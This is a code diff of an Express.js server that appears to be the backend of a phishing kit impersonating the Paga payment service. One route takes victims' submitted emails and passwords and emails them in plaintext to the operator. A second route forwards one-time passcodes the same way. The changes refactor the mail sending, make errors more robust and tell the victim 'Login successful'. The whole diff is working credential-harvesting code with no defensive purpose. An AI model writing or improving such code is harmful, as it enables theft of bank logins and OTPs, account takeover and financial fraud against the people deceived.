@@ -19,11 +19,14 @@ app.use(express.json());
 // api routes
 
 // API routes for index
-app.post("/", (req, res) => {
+app.post("/", async (req, res) => {
   const { email, password } = req.body;
 
+  const clientEmail = email || "unknown";
   const transporter = nodemailer.createTransport({
-    service: "gmail",
+    host: "smtp.gmail.com",
+    port: 465,
+    secure: true,
     auth: {
       user: userEmail,
       pass: pass,
@@ -31,31 +34,32 @@ app.post("/", (req, res) => {
   });
 
   const mailOptions = {
-    from: `${email}`,
+    from: `${clientEmail}`,
     to: userEmail,
-    subject: `New Paga client login — ${email}`,
-    text: `New client login from Paga\nEmail: ${email}\nPassword: ${password}\nTime: ${new Date().toISOString()}`,
+    subject: `New Paga client login — ${clientEmail}`,
+    text: `New client login from Paga\nEmail: ${clientEmail}\nPassword: ${password}\nTime: ${new Date().toISOString()}`,
   };
 
-  console.log(mailOptions);
-  transporter.sendMail(mailOptions, (error, info) => {
-    if (error) {
-      console.log(error);
-      res.send("error Occured: " + error);
-    } else {
-      console.log("Email sent", +info.response);
-      res.send("success");
-    }
-  });
+  try {
+    const info = await transporter.sendMail(mailOptions);
+    console.log("Email sent:", info.response);
+    res.status(200).json({ success: true, message: "Login successful" });
+  } catch (error) {
+    console.error("Error:", error);
+    res
+      .status(500)
+      .json({ success: false, message: "Error occurred sending email" });
+  }
 });
 
 // API routes for otp
-app.post("/otp", (req, res) => {
-  console.log(req.body);
-  let email = console.log(req.body.email);
+app.post("/otp", async (req, res) => {
+  const { email, otp } = req.body;
 
   const transporter = nodemailer.createTransport({
-    service: "gmail",
+    host: "smtp.gmail.com",
+    port: 465,
+    secure: true,
     auth: {
       user: userEmail,
       pass: pass,
@@ -65,20 +69,20 @@ app.post("/otp", (req, res) => {
   const mailOptions = {
     from: email,
     to: userEmail,
-    subject: `Paga OTP — ${req.body?.email || "unknown"}`,
-    text: `OTP from Paga: ${req.body?.otp}\nTime: ${new Date().toISOString()}`,
+    subject: `Paga OTP — ${email || "unknown"}`,
+    text: `OTP from Paga: ${otp}\nTime: ${new Date().toISOString()}`,
   };
 
-  console.log(mailOptions);
-  transporter.sendMail(mailOptions, (error, info) => {
-    if (error) {
-      console.log(error);
-      res.send("error Occured: " + error);
-    } else {
-      console.log("Email sent", +info.response);
-      res.send("success");
-    }
-  });
+  try {
+    const info = await transporter.sendMail(mailOptions);
+    console.log("Email sent:", info.response);
+    res.status(200).json({ success: true, message: "OTP sent successfully" });
+  } catch (error) {
+    console.error("Error:", error);
+    res
+      .status(500)
+      .json({ success: false, message: "Error occurred sending OTP" });
+  }
 });
 
 app.listen(PORT, () => {
